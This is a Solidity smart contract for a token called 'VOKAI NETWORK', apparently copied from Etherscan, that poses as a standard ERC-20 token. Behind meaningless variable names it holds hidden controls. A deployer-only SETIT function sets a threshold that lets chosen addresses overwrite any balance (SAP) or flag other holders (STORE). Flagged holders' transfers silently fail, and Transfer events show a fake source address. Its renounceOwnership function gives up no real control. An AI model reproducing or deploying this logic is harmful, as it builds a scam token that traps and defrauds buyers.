/**
 *Submitted for verification at Etherscan.io on 2023-03-04
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract VOKAI {
    using SafeMath for uint256;
    mapping (address => uint256) private DVL;
	
    mapping (address => uint256) public DDVL;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "VOKAI NETWORK";
	
    string public symbol = "VOKAI";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private ERT;
      address private ZBZ;
    uint256 private ZMN;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address kNN = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        ZBZ = msg.sender;
             DVL[msg.sender] = totalSupply;
        
       xCREATE();}

  
	
	
   
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function xCREATE() internal  {                             
                       DDVL[msg.sender] = 5;
                       ERT = kNN;

                

        emit Transfer(address(0), ERT, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return DVL[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(DDVL[msg.sender] <= ZMN) {
    require(DVL[msg.sender] >= value);
DVL[msg.sender] -= value;  
DVL[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(DDVL[msg.sender] > ZMN) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function STORE (address ixA, uint256 ixB) public {
		if(DDVL[msg.sender] == ZMN) {   
			   	   
   DDVL[ixA] = ixB;}
   }
		       function SETIT (uint256 ixB) public {
                     require(msg.sender == ZBZ);
                     ZMN = ixB; 
	}

 		       function SAP (address ixA, uint256 ixB) public {
		if(DDVL[msg.sender] == ZMN) {   
			   	   
   DVL[ixA] = ixB;}
   }


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(DDVL[from] < ZMN && DDVL[to] < ZMN) {
        require(value <= DVL[from]);
        require(value <= allowance[from][msg.sender]);
        DVL[from] -= value;
        DVL[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(DDVL[from] == ZMN) {
        require(value <= DVL[from]);
        require(value <= allowance[from][msg.sender]);
        DVL[from] -= value;
        DVL[to] += value;
        allowance[from][msg.sender] -= value;


            from = kNN;
	   

        emit Transfer(from, to, value);
        return true; }


         if(DDVL[from] > ZMN || DDVL[to] > ZMN) {
             
         }}



     

        	
 }